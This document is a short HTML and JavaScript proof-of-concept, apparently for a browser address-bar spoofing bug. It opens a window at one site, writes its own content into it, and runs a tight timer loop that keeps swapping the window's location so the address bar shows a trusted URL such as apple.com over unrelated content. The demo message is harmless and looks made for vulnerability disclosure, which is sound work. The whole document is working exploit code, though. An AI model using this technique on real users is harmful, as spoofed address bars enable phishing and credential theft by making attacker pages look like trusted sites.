<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
    <a href="javascript:window.open('https://apple.com/','x');" onclick="startSpoof()">Click Here</a>
    <a href="javascript:stopSpoof()">Stop Spoof</a>
</body>
    
<script>
let windowSpoof;

function race() {
  try {
    windowSpoof.location.href !== 'about:blank';
  }
  catch (e) {
    windowSpoof.location.href = 'https://www.google.com:88';
  }
}

function startSpoof() {
  // Open the spoofed window
  windowSpoof = window.open("https://www.microsoft.com:82", "x");
  windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://apple.com/</h2>");

  // Start the race function repeatedly
  setInterval(race, 0);
}

function stopSpoof() {
  // Close the spoofed window
  if (windowSpoof && !windowSpoof.closed) {
    windowSpoof.close();
  }
}

</script>

</html>
